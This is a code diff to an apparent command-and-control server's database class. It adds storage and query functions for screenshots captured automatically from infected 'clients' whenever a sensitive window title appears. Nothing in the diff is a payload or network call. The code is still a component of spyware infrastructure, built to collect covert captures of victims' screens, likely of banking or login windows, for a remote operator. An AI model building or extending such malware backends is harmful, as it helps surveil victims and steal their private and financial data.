@@ -238,6 +238,19 @@ class C2Database {
                 FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
             )
         `);
+
+        // Auto-screenshots triggered by sensitive window titles
+        this.db.exec(`
+            CREATE TABLE IF NOT EXISTS auto_screenshots (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                client_id TEXT NOT NULL,
+                window_title TEXT NOT NULL,
+                image_data TEXT NOT NULL,
+                captured_at INTEGER NOT NULL,
+                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
+            );
+            CREATE INDEX IF NOT EXISTS idx_auto_screenshots_client ON auto_screenshots(client_id, captured_at);
+        `);
     }
     
     // Client operations
@@ -429,6 +442,71 @@ class C2Database {
             return stmt.run(id, userId);
         }
         const stmt = this.db.prepare('DELETE FROM screenshots WHERE id = ?');
+        return stmt.run(id);
+    }
+
+    // Auto-screenshot operations
+    addAutoScreenshot(clientId, windowTitle, imageData) {
+        const stmt = this.db.prepare(`
+            INSERT INTO auto_screenshots (client_id, window_title, image_data, captured_at)
+            VALUES (?, ?, ?, ?)
+        `);
+        return stmt.run(clientId, windowTitle, imageData, Date.now());
+    }
+
+    getAutoScreenshots(clientId = null, limit = 100, offset = 0, userId = null) {
+        if (clientId) {
+            if (userId !== null) {
+                const stmt = this.db.prepare(`
+                    SELECT a.id, a.client_id, a.window_title, a.image_data, a.captured_at
+                    FROM auto_screenshots a
+                    JOIN clients c ON c.id = a.client_id
+                    WHERE a.client_id = ? AND c.user_id = ?
+                    ORDER BY a.captured_at DESC
+                    LIMIT ? OFFSET ?
+                `);
+                return stmt.all(clientId, userId, limit, offset);
+            }
+            const stmt = this.db.prepare(`
+                SELECT id, client_id, window_title, image_data, captured_at
+                FROM auto_screenshots
+                WHERE client_id = ?
+                ORDER BY captured_at DESC
+                LIMIT ? OFFSET ?
+            `);
+            return stmt.all(clientId, limit, offset);
+        }
+        if (userId !== null) {
+            const stmt = this.db.prepare(`
+                SELECT a.id, a.client_id, a.window_title, a.image_data, a.captured_at
+                FROM auto_screenshots a
+                JOIN clients c ON c.id = a.client_id
+                WHERE c.user_id = ?
+                ORDER BY a.captured_at DESC
+                LIMIT ? OFFSET ?
+            `);
+            return stmt.all(userId, limit, offset);
+        }
+        const stmt = this.db.prepare(`
+            SELECT id, client_id, window_title, image_data, captured_at
+            FROM auto_screenshots
+            ORDER BY captured_at DESC
+            LIMIT ? OFFSET ?
+        `);
+        return stmt.all(limit, offset);
+    }
+
+    deleteAutoScreenshot(id, userId = null) {
+        if (userId !== null) {
+            const stmt = this.db.prepare(`
+                DELETE FROM auto_screenshots
+                WHERE id = ? AND client_id IN (
+                    SELECT id FROM clients WHERE user_id = ?
+                )
+            `);
+            return stmt.run(id, userId);
+        }
+        const stmt = this.db.prepare('DELETE FROM auto_screenshots WHERE id = ?');
         return stmt.run(id);
     }
     
